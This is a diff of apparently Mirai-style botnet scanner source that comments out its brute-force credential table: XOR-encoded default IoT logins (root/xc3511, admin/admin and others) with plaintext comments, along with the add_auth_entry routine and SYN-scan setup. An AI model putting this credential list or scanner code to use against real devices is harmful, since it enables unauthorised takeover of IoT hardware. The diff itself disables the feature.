@@ -120,7 +120,8 @@ void scanner_init(void)
     tcph->window = rand_next() & 0xffff;
     tcph->syn = TRUE;
 
-    // Set up passwords //TODO delete password section
+    /* DISABLED
+    // Set up passwords
     add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
     add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
     add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
@@ -183,7 +184,7 @@ void scanner_init(void)
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);                  // admin    meinsm
     add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                              // tech     tech
     add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker
-
+    */
 
 #ifdef DEBUG
     printf("[scanner] Scanner process initialized. Scanning started.\n");
@@ -867,7 +868,7 @@ static int consume_resp_prompt(struct scanner_connection *conn)
     else
         return prompt_ending;
 }
-
+/* DISABLED
 static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
 {
     int tmp;
@@ -881,7 +882,7 @@ static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
     auth_table[auth_table_len++].weight_max = auth_table_max_weight + weight;
     auth_table_max_weight += weight;
 }
-
+*/
 static struct scanner_auth *random_auth_entry(void)
 {
     int i;
